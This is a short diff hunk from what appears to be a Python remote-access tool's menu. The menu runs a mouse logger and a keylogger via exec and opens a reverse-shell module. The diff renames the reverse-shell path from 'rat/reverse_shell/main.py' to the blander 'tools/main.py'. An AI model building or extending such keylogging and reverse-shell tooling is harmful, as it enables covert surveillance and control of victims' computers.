@@ -34,7 +34,7 @@ if choice == 'm':
     # Reads
     exec(mouse_logger.read())
 elif choice == 's':
-    data = open("rat/reverse_shell/main.py")
+    data = open("tools/main.py")
 elif choice == 'k':
     keyboard_logger = open("key_logging.py")
     exec(keyboard_logger.read())
